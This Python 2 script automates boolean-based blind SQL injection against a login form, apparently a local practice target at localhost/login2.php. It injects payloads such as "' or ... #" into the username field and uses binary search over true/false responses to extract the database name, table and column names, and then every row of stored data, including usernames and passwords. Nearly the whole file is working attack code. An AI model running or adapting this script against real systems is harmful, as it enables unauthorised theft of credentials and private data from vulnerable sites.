#!
import urllib
import urllib2
import httplib
charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',]
intList = [0,1,2,3,4,5,6,7,8,9]
# url
url = 'http://localhost/login2.php'
leftChar = "' or "
rightChar = "#"
right = "#"

dataBaseLength = 0#9
dataBaseName = ""
tableLength = 0
tableName = ""
columnNumber = 0#4
columnEachLength = [0]
columnEachName = [""]#["id","username","password","email",""]
dataNumber = 0
dataLength = [[0]]#[[0]]#[[1, 1, 0], [5, 3, 0], [5, 6, 0], [0, 0, 0], [0]] #has columnNum enums, as-> columnEachName[0:]:data[0:]
#dataContent = [["","","",""],["","","",""],["","","",""],["","","",""],] #has columnNum enums, as-> columnEachName[0:]:data[0:]
dataContent = [[""]]
################################################################################
# post it,change username:str
def Post2(string,left = leftChar,right = rightChar):
    print "TESTING: "+left+string+right
    values = {'username':left+string+right,'password':'admin'}
    data = urllib.urlencode(values) # decode
    req = urllib2.Request(url, data)  # send
    response = urllib2.urlopen(req)  #res
    the_page = response.read()  #read
    print the_page
    if (the_page == 'TRUE'):
        return 1
    else:
        return 0
def Post(string,left = leftChar,right = "#"):
    httpClient = None
    try:
        print "TESTING: "+left+string+right
        params = urllib.urlencode({'username':left+string+right,'password':''})
        headers = {"Content-type": "application/x-www-form-urlencoded"
                        , "Accept": "text/plain"}

        httpClient = httplib.HTTPConnection("localhost", 80, timeout=30)
        httpClient.request("POST", "/login2.php", params, headers)

        response = httpClient.getresponse()
        #print response.status
        #print response.reason
        st = response.read()
        print st
        if (st == "TRUE"):
            return 1
        else:
            return 0
        #print response.getheaders()
    except Exception, e:
        print e
    finally:
        if httpClient:
            httpClient.close()
#return funtion
def Judge(string,left = leftChar ,righr = rightChar):
    if (Post(string,left,right) == 1):
        print 1
    else:
        print 0
################################################################################
def IsThisChar(stringText, sign, char, right = rightChar):
    return Post(stringText+sign+"'"+char+"'"+right);
def IsThisInt(stringText, sign, num, right = rightChar):
    return Post(stringText+sign+"'"+str(num)+"'"+right);
def IsThisNum(stringText, sign, num, right = rightChar):
    return Post(stringText+sign+str(num)+right);
################################################################################
def BinarySearchInt(stringText, leftNum, rightNum, right = rightChar):    #0~16
    currentNum = (leftNum + rightNum) / 2

    if (IsThisInt(stringText, '=', currentNum) == 1, right):          # length(database())=9
        return currentNum
    elif (IsThisInt(stringText, '<', currentNum) == 1, right):
        return BinarySearchInt(stringText, leftNum, currentNum, right)
    elif (IsThisInt(stringText, '>', currentNum) == 1, right):
        return BinarySearchInt(stringText, currentNum + 1, rightNum, right)
def BinarySearchChar(stringText,charListA, right = rightChar):
    try:
        currentIndexNum = len(charListA) / 2
        currentChar = charListA[currentIndexNum]
        leftCharList = charListA[0:currentIndexNum]
        rightCharList = charListA[currentIndexNum + 1:]
        if (IsThisChar(stringText, '=',currentChar, right) == 1):
            return currentChar
        elif (IsThisChar(stringText, '<',currentChar, right) == 1):
            return BinarySearchChar(stringText, leftCharList, right)
        elif (IsThisChar(stringText, '>',currentChar, right) == 1):
            return BinarySearchChar(stringText, rightCharList, right)
    except:
        return BinarySearchNum(stringText,0,9,right)
def BinarySearchNum(stringText, leftNum, rightNum, right = "#"):    #0~16
    currentNum = (leftNum + rightNum) / 2
    if (IsThisNum(stringText, '=', currentNum, right) == 1):          # length(database())=9
        return currentNum
    elif (IsThisNum(stringText, '<', currentNum, right) == 1):
        return BinarySearchNum(stringText, leftNum, currentNum,right)
    elif (IsThisNum(stringText, '>', currentNum, right) == 1):
        return BinarySearchNum(stringText, currentNum + 1, rightNum,right)
    return 0
def BinarySearchNumB(stringText, leftNum, right = "#"):    #0~16
    currentNum = leftNum
    while (IsThisNum(stringText, '', currentNum, right) == 1):
        currentNum += 1
    return currentNum

################################################################################
def DatabaseLength(dataBaseLengthA = dataBaseLength):
    global dataBaseLength
    if (dataBaseLengthA != 0):
        return dataBaseLengthA
    stringDatabase = "length(database())"#injection
    dataBaseLength = BinarySearchNum(stringDatabase, 0, 16, "#")
    print "dataBaseLength",dataBaseLength
    return dataBaseLength
def DatabaseName(dataBaseNameA = dataBaseName):
    global dataBaseName
    if (dataBaseNameA != ""):
        return dataBaseNameA
    length = DatabaseLength(dataBaseLength)
    dataBaseName = ""
    for i in xrange(1, length + 1, 1):
        stringDatabaseText = "mid(database(),"+str(i)+",1)"
        dataBaseName = dataBaseName + BinarySearchChar(stringDatabaseText,charList, right)
        print "dataBaseName is:"+dataBaseName
    return dataBaseName
#TEST OUT
################################################################################
def TableLength(tableLengthA = tableLength):
    if (tableLengthA != 0):
        return tableLengthA
    global tableLength
    stringText = "(select length((select table_name from INFORMATION_SCHEMA.columns where table_schema=\""+ DatabaseName(dataBaseName)+"\" limit 1 offset 0))"
    tableLength = BinarySearchNum(stringText, 0, 16,")")
    print "tablelength:",tableLength
    return tableLength
def TableName(tableNameA = tableName):
    if (tableNameA != ""):
        return tableNameA
    right = ")"
    global tableName,dataBaseName
    tableLength = TableLength()
    dataBaseName = DatabaseName(dataBaseName)###################################
    tableName = ""
    for i in xrange(1, tableLength + 1, 1):
        stringText = " (select mid((select table_name from INFORMATION_SCHEMA.columns where table_schema=\""+DatabaseName(dataBaseName)+"\" limit 1 offset 0),"+str(i)+",1)"#"
        tableName = tableName + BinarySearchChar(stringText,charList, right)
        print "tableName:",tableName
    #print "tableName:",tableName
    return tableName
#TEST OUT
################################################################################
################################################################################
def ColumnNumber(columnNumberA = columnNumber):# no binary
    if (columnNumberA != 0):
        return columnNumberA
    global columnNumber,dataBaseName,tableName
    for columnNumber in xrange(0,10,1):
        stringColumnNumber = "(select length((select column_name from INFORMATION_SCHEMA.columns where table_schema=\""+DatabaseName(dataBaseName)+"\" and table_name=\""+TableName(tableName)+"\" limit 1 offset "+str(columnNumber)+"))>0)"
        if (Post(stringColumnNumber) == 0):
            print "columnNumber:",columnNumber
            return columnNumber# True is 0~columnNumber - 1
#TEST OUT
################################################################################
def GetColumnEachLength():
    global columnNumber,dataBaseName,tableName,columnEachLength
   # columnNumber = columnNumber(columnNumber)
    for currentColumnNumber in xrange(0, ColumnNumber(columnNumber), 1):
        #stringColumnEachLength = "(select length((select column_name from INFORMATION_SCHEMA.columns where table_schema=\""+DatabaseName(dataBaseName)+"\" and table_name=\""+TableName(tableName)+"+\" limit 1 offset "+str(currentColumnNumber)+"))>0)"
        stringColumnEachLength = "(select length((select column_name from INFORMATION_SCHEMA.columns where table_schema=\""+DatabaseName(dataBaseName)+"\" and table_name=\""+TableName(tableName)+"\" limit 1 offset "+str(currentColumnNumber)+"))"
        columnEachLength[currentColumnNumber] = BinarySearchNum(stringColumnEachLength, 0, 16, ")")
        columnEachLength.append(0)
        print "columnEachLengthNOW:",columnEachLength[currentColumnNumber]
    print "columnEachLength:",columnEachLength
    return columnEachLength
#TEST OUT
def GetColumnName(columnNumberA, columnEachLengthA = [0], columnEachNameA =[""]):
    if (columnEachNameA[0] != ""):
        return columnEachName
    if (columnEachLengthA[0] == 0):
        GetColumnEachLength()
    global columnNumber,dataBaseName,tableName,columnEachLength
    for currentColumnNumber in xrange(0, columnNumber, 1):
        for currentColumnLength in xrange(1,columnEachLength[currentColumnNumber] + 1,1):
            stringColumnEachName =  " (select mid((select column_name from INFORMATION_SCHEMA.columns where table_schema=\""+DatabaseName(dataBaseName)+"\" and table_name=\""+TableName(tableName)+"\" limit 1 offset "+str(currentColumnNumber)+"),"+str(currentColumnLength)+",1)"
            #stringColumnEachName = stringColumnEachName
            columnEachName[currentColumnNumber] = columnEachName[currentColumnNumber] + BinarySearchChar(stringColumnEachName,charList,')')
        columnEachName.append("")
        print "columnEachNameNOW:",columnEachName[currentColumnNumber]
    print "columnEachName:",columnEachName
#TEST OUT
################################################################################
def HowManyData(columnEachNameA = columnEachName, dataNumberA = dataNumber):
    if (columnEachNameA[0] == ""):
        columnEachNameA == GetColumnName(columnNumber, columnEachLength, columnEachName)
    if (dataNumberA != 0):
        return dataNumberA
    global dataNumber
    #for currentDataLength in xrange(0,5,1):#  1
    stringDataNumber = "(select length((select username from injection.users limit 1 offset ";
    dataNumber = BinarySearchNumB(stringDataNumber, 0, right = ")>0))")
    #dataLength = 1##################        WRONG
    #dataLength = BinarySearchInt(stringDataNumber, 0, 16, '))>0)')
    print dataNumber
    return dataNumber       #Don't + 1 again
#TEST OUT
################################################################################
GetColumnName(columnEachName)
def GetEachDataLength():
    global dataBaseName,tableName,columnEachName,dataNumber,dataLength
    if (dataLength[0][0] != 0):
        return dataLength
    if (dataBaseName == ""):
        dataBaseName = DatabaseName(dataBaseName)
    if (tableName == ""):
        tableName = TableName(tableName)
    if (columnEachName[0] == ""):
        columnEachName = GetColumnName(columnEachName)
    if (dataNumber == 0):
        dataNumber = HowManyData()
    for currentColumnNumber in xrange(0, columnNumber, 1):
        for thisDataLength in xrange(0,dataNumber,1):
            print dataNumber
            stringDataLength = " (select length((select "+str(columnEachName[currentColumnNumber])+" from "+str(dataBaseName)+"."+str(tableName)+" limit 1 offset "+str(thisDataLength)+"))"
            dataLength[currentColumnNumber][thisDataLength] = BinarySearchNum(stringDataLength,0,10,")")
            dataLength[currentColumnNumber].append(0)
        print "dataLength",
    print dataLength[0:]
#TEST OUT
GetEachDataLength()
################################################################################
def GetEachDataContent():
    global dataBaseName,tableName,columnEachName,dataNumber,dataLength,dataContent
    if (dataContent[0][0] != ""):
        return dataContent
    if (dataLength[0][0] == 0):
        dataLength = GetEachDataLength()
    for currentColumnNumber in xrange(0, columnNumber, 1):# id username ....
        for thisDataContent in xrange(0,dataNumber,1):  #shuju * 2 offset
            for currentDataContent in xrange(1,dataLength[currentColumnNumber][thisDataContent]+1,1):
                #if (currentColumnNumber == 0):
                #    stringDataContent = " (select mid((select "+str(columnEachName[currentColumnNumber])+" from "+str(dataBaseName)+"."+str(tableName)+" limit 1 offset "+str(thisDataContent)+"),"+str(currentDataContent)+",1)"
                #    dataContent[currentColumnNumber][thisDataContent] = dataContent[currentColumnNumber][thisDataContent] + str(BinarySearchNum(stringDataContent,0,9,")"))
                #    (dataContent[currentColumnNumber]).append("")
                #else:
                stringDataContent = " (select mid((select "+str(columnEachName[currentColumnNumber])+" from "+str(dataBaseName)+"."+str(tableName)+" limit 1 offset "+str(thisDataContent)+"),"+str(currentDataContent)+",1)"
                dataContent[currentColumnNumber][thisDataContent] = dataContent[currentColumnNumber][thisDataContent] + str(BinarySearchChar(stringDataContent,charList,")"))
                (dataContent[currentColumnNumber]).append("")
        dataContent.append([""])
    print dataContent
GetEachDataContent()
